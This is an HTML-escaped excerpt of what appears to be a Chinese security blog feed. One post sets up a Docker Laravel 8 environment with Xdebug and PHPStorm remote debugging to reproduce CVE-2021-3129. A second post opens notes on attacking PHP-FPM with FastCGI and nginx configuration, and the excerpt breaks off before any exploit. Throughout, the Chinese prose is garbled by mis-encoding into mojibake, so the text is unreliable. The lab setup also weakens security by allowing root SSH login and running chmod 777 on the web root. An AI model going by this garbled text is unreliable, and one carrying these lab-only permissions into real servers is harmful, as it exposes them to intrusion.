&lt;p>ä¸€åˆ‡çš„èµ·å› æ˜¯æˆ‘æƒ³å¤ç°cve-2021-3129ï¼Œé¡ºä¾¿äº²è‡ªåŠ¨æ‰‹è·Ÿä¸€è·Ÿ&amp;amp;æŒ–ä¸€æŒ–laravelæ¡†æ¶ååºåˆ—åŒ–çš„é“¾å­ï¼Œç»“æœä»£ç å®¡è®¡ä¹‹å‰å…ˆè¢«ç¯å¢ƒé…ç½®å›°ä½äº†ï¼›è¢«è¿™ä¸ªç³Ÿå¿ƒçš„è°ƒè¯•ä»å‘¨äºŒä¸‹åˆæŠ˜ç£¨åˆ°å‘¨å››çš„å‡Œæ™¨ï¼Œå‡ ä¹æ˜¯æŠŠèƒ½è¸©çš„å‘è¸©äº†ä¸ªéï¼ˆç—›è‹¦é¢å…·ï¼‰ï¼Œç›´åˆ°ç°åœ¨çš„è§£å†³æ–¹æ¡ˆä¹Ÿä¸èƒ½ç®—æ˜¯æœ€ä¼˜è§£ï¼Œä¸è¿‡æ˜¯èƒ½æ­£å¸¸ç¨³å®šçš„è·‘èµ·æ¥äº†ï¼Œæ¬¡ä¼˜è§£ï¼›æ„Ÿè°¢portainerè®©æˆ‘èƒ½è½»æ¾åˆ›å»ºdocker&lt;/p>
&lt;p>æŠŠè¯¦ç»†çš„æ­¥éª¤è®°å½•åˆ°è¿™ç¯‡åšå®¢é‡Œï¼Œå¸Œæœ›å¯ä»¥å¸®åŠ©åˆ°çœ‹åˆ°çš„äºº~æ¬¢è¿å‹å¥½äº¤æµï¼&lt;/p>
&lt;hr>
&lt;p>å…ˆè¯´ä¸‹æœ¬æ¬¡é…ç½®çš„ç¯å¢ƒæ•´ä½“éœ€æ±‚å§ï¼š&lt;/p>
&lt;ul>
&lt;li>è¿œç¨‹vpsçš„docker(FROM php:7.4-apache): éœ€å¼€æ”¾webé¡µé¢ç«¯å£ + sshç«¯å£ï¼ˆæ— éœ€æŒ‚è½½ç›®å½•&lt;/li>
&lt;li>laravel 8.4.2, laravel/framework 8.22.1, facade/ignition 2.5.1&lt;/li>
&lt;li>æœ¬åœ°ide: PHPStorm + ä¸€ä¸ªæ˜ å°„åˆ°å…¬ç½‘ipçš„ä¾›è°ƒè¯•è¿æ¥ä½¿ç”¨çš„ç«¯å£ï¼ˆåé¢ä¼šè§£é‡ŠåŸå› ï¼‰&lt;/li>
&lt;/ul>
&lt;p>é™¤äº†æœ€åçš„laravelä¹‹å¤–å°±éƒ½æ˜¯è°ƒphpçš„é€šç”¨æµç¨‹å•¦ï¼Œè®©æˆ‘ä»¬å¼€å§‹å§~&lt;/p>
&lt;h2 id="è¿œç¨‹dockerlaravelçš„ç¯å¢ƒæ­å»º">è¿œç¨‹docker&amp;amp;laravelçš„ç¯å¢ƒæ­å»º&lt;/h2>
&lt;p>ä»¥php:7.4-apacheé•œåƒä½œä¸ºåŸºç¡€è¿›è¡Œåˆ›å»ºï¼Œæˆ‘è¿™é‡Œç”¨çš„æ˜¯portainerï¼ˆåˆ«é—®ä¸ºä»€ä¹ˆä¸å†™dockerfileï¼Œé—®å°±æ˜¯è¿˜åœ¨å­¦ç€æ€ä¹ˆå†™ï¼ˆä¸€å®šä¸é¸½ è¿‘æœŸä¼šæ›´æ–°åˆ°è¿™é‡Œçš„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125164513693.png" alt="image-20211125164513693">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">apt update
apt-get install -y ssh git unzip
vim /etc/ssh/sshd_config &lt;span style="color:#75715e"># å¼€å¯å¯¹åº”é€‰é¡¹ æ¯”å¦‚å…è®¸rootè¿æ¥ä»€ä¹ˆçš„ ä¸ç”¨æˆ‘ç»†å—¦ å„ä½å¸¦æ‰‹å­ä»¬éƒ½åº”è¯¥æ‡‚&lt;/span>
pecl install xdebug
touch /var/log/php/xdebug_remote.log &lt;span style="color:#75715e"># å¦‚æœéœ€è¦logçš„è¯è¦æå‰åˆ›å»ºå¥½å™¢&lt;/span>
vim /usr/local/etc/php/php.ini &lt;span style="color:#75715e"># å°†ä¸‹é¢æ¡†ä¸­å†…å®¹ç²˜åˆ°æœ«å°¾å³å¯&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#00a8c8">[Xdebug]&lt;/span>
&lt;span style="color:#75715e">; è¿™ä¸€é¡¹å®‰è£…å¥½ä¹‹åä¼šæœ‰æç¤º&lt;/span>
&lt;span style="color:#75af00">zend_extension&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;/usr/local/lib/php/extensions/no-debug-non-zts-20190902/xdebug.so&amp;#34;&lt;/span>
&lt;span style="color:#75af00">xdebug.mode&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">debug&lt;/span>
&lt;span style="color:#75af00">xdebug.client_host&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">your_vps&lt;/span>
&lt;span style="color:#75af00">xdebug.client_port&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">port&lt;/span>
&lt;span style="color:#75af00">xdebug.idekey&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">laravel&lt;/span>
&lt;span style="color:#75af00">xdebug.remote_handler&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;dbgp&amp;#34;&lt;/span>
&lt;span style="color:#75af00">xdebug.log&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;/var/log/php/xdebug_remote.log&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ­¤å¤„å®‰è£…ç‰ˆæœ¬ä¸ºxdebug3ï¼Œä¸xdebug2çš„é…ç½®è¯­æ³•æœ‰ä¸€äº›å‡ºå…¥ï¼Œå…·ä½“æ›´æ–°çš„å†…å®¹è¯¦è§&lt;a href="https://xdebug.org/docs/upgrade_guide">æ›´æ–°æ–‡æ¡£&lt;/a>ï¼Œå®‰è£…å¥½xdebugåæ‰§è¡Œ&lt;code>php -v&lt;/code>å‘½ä»¤ä¼šæœ‰æ˜¾ç¤ºç‰ˆæœ¬&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125164949111.png" alt="image-20211125164949111">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">wget https://github.com/composer/composer/releases/download/2.1.12/composer.phar
mv composer.phar /usr/local/bin/composer
chmod +x /usr/local/bin/composer
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#111">cd&lt;/span> /var/www
composer create-project laravel/laravel . &lt;span style="color:#d88200">&amp;#34;v8.4.2&amp;#34;&lt;/span>
vim composer.json &lt;span style="color:#75715e"># ä¿®æ”¹å†…å®¹è§ä¸‹&lt;/span>
composer update
mv public html
chmod -R &lt;span style="color:#ae81ff">777&lt;/span> /var/www
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#75af00">&amp;#34;laravel/framework&amp;#34;: &amp;#34;8.22.1&amp;#34;&lt;/span>
&lt;span style="color:#75af00">&amp;#34;facade/ignition&amp;#34;: &amp;#34;2.5.1&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸€ä¸ªå‘ç‚¹ï¼šå³ä½¿æŒ‡å®šäº†&lt;a href="laravel/laravel">laravel/laravel&lt;/a>ç‰ˆæœ¬ï¼Œcomposeråˆ›å»ºé»˜è®¤ä¼šä½¿ç”¨æœ€æ–°çš„&lt;a href="laravel/framework">laravel/framework&lt;/a>ç‰ˆæœ¬&amp;amp;ç›¸å…³ç»„ä»¶ä¾èµ–ï¼ˆæ¯”å¦‚ç°åœ¨æ˜¯8.73.2ï¼‰ï¼Œç”±äºæˆ‘ä»¬éœ€è¦å¤ç°çš„cveæœ‰ç‰¹æ®Šçš„laravelç»„ä»¶ç‰ˆæœ¬éœ€æ±‚ï¼Œï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å•ç‹¬å¯¹composer.jsonè¿›è¡Œä¿®æ”¹ï¼Œç„¶åæ‰§è¡Œ&lt;code>composer update&lt;/code>è¿›è¡Œæ›´æ–°&lt;/p>
&lt;p>ä¸€åˆ‡é¡ºåˆ©çš„è¯è®¿é—®webé¡µé¢å°±å¯ä»¥çœ‹åˆ°laravelå•¦&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125165355843.png" alt="image-20211125165355843">&lt;/p>
&lt;h2 id="ä¸æœ¬åœ°çš„phpstormè¿æ¥èµ·æ¥è¿›è¡Œdebug">ä¸æœ¬åœ°çš„PHPStormè¿æ¥èµ·æ¥è¿›è¡Œdebug&lt;/h2>
&lt;p>å¼€å§‹ä¹‹å‰å…ˆè‡ªé—®è‡ªç­”ä¸€ä¸‹ï¼šä¸ºä»€ä¹ˆè°ƒè¯•è¦ä¸€ä¸ªèƒ½æ˜ å°„åˆ°å…¬ç½‘çš„ç«¯å£ï¼Ÿ&lt;/p>
&lt;p>PHPStormä¸­é›†æˆäº†éµå¾ªDBGpåè®®çš„Xdebugæ’ä»¶ï¼Œå½“å¼€å¯ç›‘å¬æ—¶ä¼šç›‘å¬æœ¬åœ°æŒ‡å®šç«¯å£ï¼Œå½“è®¿é—®æŒ‡å®šserverçš„webé¡µé¢å¹¶å¸¦æœ‰å«æœ‰ide_keyçš„ç‰¹å®šcookieå‚æ•°ä¹‹åï¼ŒXdebugä¼šæ¥æ”¶åˆ°è¿™ä¸ªå‚æ•°å¹¶å¼€å¯debugï¼Œé€šè¿‡DBGpåè®®å‘php.iniä¸­æŒ‡å®šçš„ip&amp;amp;portå‘é€è¯·æ±‚ï¼Œå½“è¿™ä¸ªportæŒ‡å‘æˆ‘ä»¬ideåœ¨ç›‘å¬çš„ç«¯å£æ—¶ï¼Œå°±ä¼šå»ºç«‹èµ·Xdebugå’Œideçš„è¿æ¥ï¼ˆä½¿ç”¨DBGpåè®®é€šè®¯ï¼‰ï¼Œéšåå®ƒä»¬ä¹‹é—´è¿›è¡Œæ•°æ®äº¤äº’ï¼Œå¦‚æ­¤åå¤ï¼›æ›´è¯¦ç»†çš„å†…å®¹è¯·å‚è§-&amp;gt;&lt;a href="https://xdebug.org/docs/dbgp#id32">6.3 IDE to debugger engine communications&lt;/a>&lt;/p>
&lt;p>è¿™ä¸‹å°±å¥½ç†è§£äº†å­ï¼Ÿä¹Ÿå°±æ˜¯è¯´ï¼Œéœ€è¦ä¸€ä¸ªä¸è¿œç¨‹ä»£ç è¿è¡Œç¯å¢ƒå¤„åœ¨åŒä¸€ä¸ªç½‘æ®µä¸‹çš„ç«¯å£ï¼ˆå…¬ç½‘çš„æ›´å¥½ï¼‰ï¼›æ¥ä¸‹æ¥å°±æ˜¯é…ç½®å•¦&lt;/p>
&lt;h3 id="å†…ç½‘ç©¿é€">å†…ç½‘ç©¿é€&lt;/h3>
&lt;p>å†…ç½‘ç©¿é€æˆ‘ä½¿ç”¨çš„æ˜¯npsï¼Œé…ç½®è¿‡ç¨‹å¯ä»¥å‚è€ƒ&lt;a href="https://ehang-io.github.io/nps/#/run">å®˜æ–¹æ–‡æ¡£&lt;/a>ï¼Œç”±äºæˆ‘è¿™é‡Œé…çš„æ¯”è¾ƒæ—© è¿™éƒ¨åˆ†è·³è¿‡&lt;/p>
&lt;h3 id="phpstormçš„è®¾ç½®æœ‰ä¸€å †">PHPStormçš„è®¾ç½®æœ‰ä¸€å †&lt;/h3>
&lt;p>æŠŠdockerä¸­/wwwç›®å½•æ‰“åŒ…æ‹–ä¸‹æ¥ï¼Œç”¨PHPStormæ‰“å¼€&lt;/p>
&lt;h4 id="è®¾ç½®debug">è®¾ç½®Debug&lt;/h4>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125172830540.png" alt="image-20211125172830540">&lt;/p>
&lt;p>20007æ˜¯æœ¬åœ°ç«¯å£ï¼Œè¢«æ˜ å°„åˆ°å…¬ç½‘ip&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125172903465.png" alt="image-20211125172903465">&lt;/p>
&lt;p>è¿™é‡Œçš„20007æ˜¯å…¬ç½‘ç«¯å£ï¼Œä»£ç†æœ¬åœ°çš„20007&lt;/p>
&lt;p>å¦‚æœæˆ‘è®²æ¸…æ¥šå‰é¢åŸç†çš„è¯ï¼Œå¤§å®¶åº”è¯¥èƒ½ç†è§£è¿™ä¸¤ä¸ªåœ°æ–¹çš„ç«¯å£è®¾ç½®äºŒé€‰ä¸€å³å¯&lt;/p>
&lt;h4 id="è®¾ç½®deployment">è®¾ç½®Deployment&lt;/h4>
&lt;p>ç”¨SFTPä¸dockerè¿›è¡Œsshè¿æ¥ï¼Œæ–‡ä»¶æ˜ å°„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125174439189.png" alt="image-20211125174439189">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125174449223.png" alt="image-20211125174449223">&lt;/p>
&lt;h4 id="è®¾ç½®è¿œç¨‹phpè§£é‡Šå™¨">è®¾ç½®è¿œç¨‹phpè§£é‡Šå™¨&lt;/h4>
&lt;p>é€‰æ‹©sshæ¨¡å¼ï¼Œé…ä¸€ä¸‹è´¦å·å¯†ç ç«¯å£å°±è¡Œï¼ˆè‡³äºä¸ºä»€ä¹ˆä¸ç”¨docker/docker-composeï¼Œä¹‹åä¼šè¯´ï¼‰ï¼Œè¿™é‡Œçš„Path mappingsç›´æ¥å°±æ˜¯Deploymentä¸­é…å¥½çš„ï¼Œå¯ä»¥å•ç‹¬å†åŠ ï¼Œä½†æ˜¯æ²¡å¿…è¦&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125173731219.png" alt="image-20211125173731219">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125174004041.png" alt="image-20211125174004041">&lt;/p>
&lt;h4 id="è®¾ç½®server">è®¾ç½®Server&lt;/h4>
&lt;p>æ³¨æ„é«˜äº®åœ°æ–¹çš„è®¾ç½®ï¼Œæ˜¯webé¡µé¢çš„ç«¯å£ï¼Œä¹Ÿè¦è®¾ç½®å¥½æœ¬åœ°çš„è·¯å¾„æ˜ å°„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125173454167.png" alt="image-20211125173454167">&lt;/p>
&lt;h3 id="éªŒè¯ä¸€ä¸‹è”é€šæƒ…å†µ">éªŒè¯ä¸€ä¸‹è”é€šæƒ…å†µ&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125175835232.png" alt="image-20211125175835232">&lt;/p>
&lt;p>å¥½è€¶~&lt;/p>
&lt;h3 id="æµè§ˆå™¨æ’ä»¶xdebug-helper">æµè§ˆå™¨æ’ä»¶Xdebug helper&lt;/h3>
&lt;p>è®¾ç½®Debug Configurationï¼Œé€‰PHP Remote Debugæ¨¡å¼&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125175154353.png" alt="image-20211125175154353">&lt;/p>
&lt;p>å®‰è£…æ’ä»¶ï¼Œè®¾ç½®ide_keyï¼Œå¼€å¯å°è™«å­&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125180035074.png" alt="image-20211125180035074">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125180424620.png" alt="image-20211125180424620">&lt;/p>
&lt;h2 id="ç»ˆäºå®Œäº†">ç»ˆäºå®Œäº†&lt;/h2>
&lt;p>éšä¾¿æ‰“ä¸ªæ–­ç‚¹ï¼Œå¼€å¯æœ¬åœ°ç›‘å¬&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125180223037.png" alt="image-20211125180223037">&lt;/p>
&lt;p>åˆ·æ–°é¡µé¢&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211125180453865.png" alt="image-20211125180453865">&lt;/p>
&lt;p>èŠœæ¹–èµ·é£ï¼&lt;/p>
&lt;h2 id="å¾…å®Œå–„çš„åœ°æ–¹">***å¾…å®Œå–„çš„åœ°æ–¹&lt;/h2>
&lt;ul>
&lt;li>é…ç½®è¿œç¨‹phpè§£é‡Šå™¨å¯ä»¥ä½¿ç”¨docker/docker-composeï¼Œè¿™ä¸¤ä¸ªéƒ½éœ€è¦å•ç‹¬æŒ‚è½½å…³é”®ç›®å½•å‡ºæ¥ï¼Œé…ç½®ä¸Šä¸sshçš„åŒºåˆ«è¿˜æ˜¯æœ‰ç‚¹å¤§çš„ï¼Œä¹Ÿéœ€è¦æ³¨æ„docker-composeæ–‡ä»¶çš„ç¼–å†™ï¼Œå…ˆæ‰”ä¸€ä¸ªå‚è€ƒèµ„æ–™-&amp;gt;&lt;a href="https://www.pascallandau.com/blog/setup-phpstorm-with-xdebug-on-docker/#setup-the-docker-containers">Setting up PhpStorm with Xdebug for local development on Docker &amp;hellip; natively and via Deployment Configuration.&lt;/a>&lt;/li>
&lt;li>å…³äºdockerfile/docker-composeæ–‡ä»¶çš„ç¼–å†™ï¼Œæˆ‘è¿˜ä¸æ˜¯å¾ˆç†Ÿç»ƒï¼Œè·Ÿä¸ç”¨è¯´è¿™æ ·çš„phpé¡¹ç›®äº†ï¼ŒåŒæ ·å…ˆæ‰”ä¸€ä¸ªå‚è€ƒèµ„æ–™-&amp;gt;&lt;a href="https://www.pascallandau.com/blog/structuring-the-docker-setup-for-php-projects/">Structuring the Docker setup for PHP Projects &amp;hellip; folder structure, Dockerfile templates and general fundamentals&lt;/a>&lt;/li>
&lt;li>PHPStormæœ‰å†…ç½®çš„dockerç®¡ç†åŠŸèƒ½ï¼Œå¯ä»¥åˆ›å»ºé•œåƒ-&amp;gt;é…ç½®debugä¸€æ­¥åˆ°ä½&lt;/li>
&lt;/ul>
&lt;hr>
&lt;p>è™½ç„¶è¸©äº†å¾ˆå¤šå‘ï¼Œä½†æ˜¯ä¹Ÿå­¦åˆ°äº†ä¸å°‘ä¸œè¥¿ï¼Œå¸Œæœ›èƒ½å¤šå°‘å¸®åŠ©ä¸€äº›äººå°‘èµ°å¼¯è·¯ï¼ˆ&lt;/p>
&lt;p>é™äºç¯‡å¹…åŸå› ï¼Œä»£ç å®¡è®¡çš„éƒ¨åˆ†å°±æ”¾åˆ°åé¢å•¦~&lt;/p>
&lt;p>æœ€è¿‘æ›´æ–°çš„ä¸å¤ªå‹¤å¿«ï¼Œæˆ‘å…ˆè‡ªæˆ‘æ‰¹è¯„TATï¼Œå·²ç»å¾ˆèœäº†ä¸èƒ½å†ä¸åŠªåŠ›å•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Š&lt;/p></description></item><item><title>æ”»å‡»PHP-FPMå­¦ä¹ ç¬”è®°</title><link>https://amiaaaz.github.io/2021/11/18/attack-php-fpm-study-notes/</link><pubDate>Thu, 18 Nov 2021 00:03:25 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/18/attack-php-fpm-study-notes/</guid><description>&lt;p>ä¹‹å‰åšé¢˜æ€»æ˜¯ä¼šè§åˆ°ï¼Œä½†å¹¶ä¸æ˜¯å¾ˆæ‡‚å®é™…çš„åŸç†ï¼Œæœ‰ç‚¹äº‘é‡Œé›¾é‡Œçš„ï¼Œå¥½åƒæ‡‚äº†ä½†åˆæ²¡æœ‰å®Œå…¨æ‡‚ï¼Œæ˜¯æ—¶å€™ä¸“é—¨æ¥å­¦ä¸€ä¸‹å’¯ï¼&lt;/p>
&lt;p>æ²¡æœ‰ä»€ä¹ˆæ–°é²œçš„ä¸œè¥¿ï¼Œåªä¸è¿‡æŠŠå¸ˆå‚…ä»¬å·²æœ‰çš„æ–‡ç« è¿›è¡Œä¸€ä¸ªæ•´åˆ&amp;amp;é‡æ–°æ•´ç†ï¼Œå‚è€ƒé“¾æ¥æ”¾åˆ°æœ€åå•¦w&lt;/p>
&lt;h2 id="å‰ç½®çŸ¥è¯†">å‰ç½®çŸ¥è¯†&lt;/h2>
&lt;h3 id="cgifastcgi">CGI/FastCGI&lt;/h3>
&lt;p>CGIåè®®ç”¨äºå¤„ç†htmlè¿™ç±»é™æ€æ–‡ä»¶ä¹‹åå‡ºç°çš„åŠ¨æ€è¯­è¨€çš„è§£é‡Šå™¨ä¸webserveré€šä¿¡çš„é—®é¢˜ï¼Œå…·ä½“çš„å®ç°æœ‰php-cgi&lt;/p>
&lt;p>CGIçš„å¼Šç«¯æ˜¯ä»¤webserveræ¯æ¬¡å¤„ç†è¯·æ±‚æ—¶éƒ½ä¼šforkä¸€ä¸ªcgiè¿›ç¨‹ï¼Œç»“æŸåå†killï¼Œæ¯”è¾ƒæµªè´¹èµ„æºï¼ŒFastCGIåè®®å°±è§£å†³äº†è¿™ä¸ªé—®é¢˜ï¼Œå¤„ç†å®Œè¯·æ±‚åä¸ä¼škillè€Œæ˜¯ä¿ç•™è¯¥è¿›ç¨‹ï¼Œä½¿å®ƒå¯ä»¥ä¸€æ¬¡å¤„ç†å¤šä¸ªè¯·æ±‚ï¼Œè¿™æ ·å°±ä¸ç”¨æ¯æ¬¡forkäº†&lt;/p>
&lt;p>è€Œphp-fpmå°±æ˜¯FastCGIåè®®çš„ä¸€ä¸ªå…·ä½“å®ç°ï¼Œä½œä¸ºFastCGIè¿›ç¨‹ç®¡ç†å™¨ï¼ˆè¿è¡Œæ—¶æœ‰ä¸€ä¸ªä¸»è¿›ç¨‹å’Œå¤šä¸ªåŒ…å«phpè§£é‡Šå™¨çš„workerè¿›ç¨‹æ¥æ‰§è¡Œä»£ç ï¼‰ï¼Œç”¨äºæ¥æ”¶webserverçš„è¯·æ±‚&lt;/p>
&lt;p>æŸ¥çœ‹phpinfoï¼ŒSever APIå¤„ä¸€èˆ¬ä¼šæœ‰ä¸‰ç§æ ·å¼ï¼š&lt;/p>
&lt;ul>
&lt;li>Apache 2.0 Handler&lt;/li>
&lt;li>CGI/FastCGI&lt;/li>
&lt;li>FPM/FastCGI&lt;/li>
&lt;/ul>
&lt;p>ç¬¬ä¸€ç§æŠŠphpä½œä¸ºapacheçš„ä¸€ä¸ªæ¨¡å—ï¼Œç›¸å½“äºapacheä¸­çš„ä¸€ä¸ª.dllæˆ–.soï¼›ç¬¬äºŒç§php-cgi.exeæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„è¿›ç¨‹ï¼ŒwebæœåŠ¡å™¨ä¹Ÿæ˜¯ç‹¬ç«‹çš„apache.exeï¼ŒwebæœåŠ¡å™¨ç›‘å¬åˆ°httpè¯·æ±‚æ—¶ä¼šå»è°ƒç”¨php-cgiè¿›ç¨‹ï¼Œä¹‹é—´é€šè¿‡cgiåè®®ä¼ é€’æ•°æ®ï¼›è€Œç¬¬ä¸‰ç§fastcgiä¹Ÿæ˜¯ä¸€ç§åè®®ï¼Œå®ƒåšäº†å¾ˆå¤šä¼˜åŒ–ä¸”å¸¸é©»å†…å­˜ ä¸ç”¨æ¯æ¬¡éƒ½è°ƒç”¨ä¸€ä¸‹cgiï¼Œæœ‰è¾…åŠ©åŠŸèƒ½æ¯”å¦‚å†…å­˜ç®¡ç†ï¼Œåƒåœ¾å¤„ç†ç”±php-fpmæ¥å®ç°&lt;/p>
&lt;h3 id="é…ç½®">é…ç½®&lt;/h3>
&lt;p>php-fpmé€šä¿¡æ–¹å¼æœ‰tcpï¼ˆæœ¬åœ°ç›‘å¬9000ç«¯å£ï¼‰å’Œunix socketå¥—æ¥å­—ä¸¤ç§æ–¹å¼ï¼Œé¢˜ç›®ä¸­å¯ä»¥è§åˆ°çš„éƒ½æ˜¯tcp9000&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">apt update
apt install nginx -y
apt install software-properties-common -y
apt install php7.4-fpm -y
&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="tcpæ¨¡å¼">tcpæ¨¡å¼&lt;/h4>
&lt;p>/etc/php/7.4/fpm/pool.d/www.conf&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#75af00">listen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">127.0.0.1:9000&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>/etc/nginx/sites-enabled/default&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#75af00">server{&lt;/span>
&lt;span style="color:#75af00">...&lt;/span>
&lt;span style="color:#75af00">location ~ \.php$ {&lt;/span>
&lt;span style="color:#75af00">include snippets/fastcgi-php.conf;&lt;/span>
&lt;span style="color:#75af00">fastcgi_pass 127.0.0.1:9000;&lt;/span>
&lt;span style="color:#75af00">}&lt;/span>
&lt;span style="color:#75af00">...&lt;/span>
&lt;span style="color:#75af00">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="unix-socketæ¨¡å¼">unix socketæ¨¡å¼&lt;/h4>
&lt;p>å¦‚æœå¯åŠ¨fpmä¸åšæ”¹åŠ¨ï¼Œé»˜è®¤ä¸ºå¥—æ¥å­—æ¨¡å¼&lt;/p>
&lt;p>/etc/php/7.4/fpm/pool.d/www.conf&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#75af00">listen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">/run/php/php7.4-fpm.sock&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>/etc/nginx/sites-enabled/default&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#75af00">server{&lt;/span>
&lt;span style="color:#75af00">...&lt;/span>
&lt;span style="color:#75af00">location ~ \.php$ {&lt;/span>
&lt;span style="color:#75af00">include snippets/fastcgi-php.conf;&lt;/span>
&lt;span style="color:#75af00">fastcgi_pass unix:/run/php/php7.4-fpm.sock;&lt;/span>
&lt;span style="color:#75af00">}&lt;/span>
&lt;span style="color:#75af00">...&lt;/span>
&lt;span style="color:#75af00">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç„¶åé‡å¯å³å¯&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">service nginx start &lt;span style="color:#75715e"># reload&lt;/span>
/etc/init.d/php7.4-fpm start &lt;span style="color:#75715e"># restart&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¦‚æœå‡ºç°æŠ¥é”™è¯·æŸ¥çœ‹å¯¹åº”æ—¥å¿—&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">cat /var/log/nginx/error.log
cat /var/log/php7.4-fpm.log
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="æ¼æ´æˆå› ">æ¼æ´æˆå› &lt;/h2>
&lt;p>æŒ‰FastCGIåè®®ä¼ è¾“çš„å†…å®¹åˆ†ä¸ºheaderå’Œbodyä¸¤éƒ¨åˆ†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#00a8c8">typedef&lt;/span> &lt;span style="color:#00a8c8">struct&lt;/span> &lt;span style="color:#111">{&lt;/span>
